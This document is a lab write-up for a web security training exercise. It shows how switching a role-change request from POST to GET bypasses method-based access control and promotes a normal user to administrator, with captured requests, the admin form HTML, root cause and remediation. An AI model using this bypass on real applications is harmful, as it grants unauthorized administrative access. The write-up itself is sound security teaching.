# Method-Based Access Control Can Be Circumvented

## Description

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

## Solution

### Step 1: Confirm wiener cannot access the admin panel

I logged in as `wiener` and attempted to access `/admin` directly:

```http
GET /admin HTTP/2
Host: 0a1e00810458acd084d1a4ab002d000f.web-security-academy.net
X-Http-Method: GET
Cookie: session=ZhI5gufJjeGBR33mH0zqZX5pikcXZx46
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a1e00810458acd084d1a4ab002d000f.web-security-academy.net/admin-roles?username=wiener&action=upgrade
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

As expected, the server returned `401 Unauthorized`, since `wiener` is a normal user without admin access.

### Step 2: Inspect the admin panel as administrator

I logged in as `administrator` using the credentials provided for familiarization (`administrator:admin`) and visited `/admin`. The page contained the following role management form:

```html
<form style="margin-top: 1em" class="login-form" action="/admin-roles" method="POST">
    <label>User</label>
    <select name="username">
        <option value="carlos">carlos (NORMAL)</option>
        <option value="administrator">administrator (ADMIN)</option>
        <option value="wiener">wiener (NORMAL)</option>
    </select>
    <button class="button" name="action" value="upgrade" type="submit"> Upgrade user </button>
    <button class="button" name="action" value="downgrade" type="submit"> Downgrade user </button>
</form>
```

This form submits a `POST` request to `/admin-roles` with `username` and `action` parameters, used to upgrade or downgrade a given user's role.

### Step 3: Test the endpoint as a normal user

I logged out and, while authenticated as `wiener`, sent a `POST` request directly to `/admin-roles` with the required parameters (`username=wiener&action=upgrade`). This returned `401 Unauthorized`, confirming that the `POST` method on this endpoint was properly protected.

### Step 4: Switch the HTTP method

Since the lab title indicates the access control is method-based, I suspected that authorization might only be enforced for the `POST` method, and not for other methods reaching the same underlying logic. I changed the request from a `POST` with a body to a `GET` request with the same parameters in the query string:

```
GET /admin-roles?username=wiener&action=upgrade
```

This request succeeded and upgraded `wiener`'s role to administrator, solving the lab.

## Root Cause

The application's access control for `/admin-roles` checks authorization only for requests using the `POST` method. The underlying role-change logic, however, also accepts the same parameters via `GET`, and this code path does not perform the same authorization check. As a result, an attacker can bypass the access control entirely by submitting the exact same action through a different, unchecked HTTP method.

## Remediation

- Enforce access control at a layer that applies uniformly to all HTTP methods capable of reaching sensitive functionality, rather than checking authorization only for the method used by the legitimate front-end form.
- Avoid allowing state-changing actions, such as role changes, to be triggered via `GET` requests at all; such actions should require `POST` (or another appropriate method) with CSRF protections, and no equivalent unauthenticated path should exist.
- Centralize authorization logic so that it is applied consistently regardless of how a request arrives at a given endpoint or handler.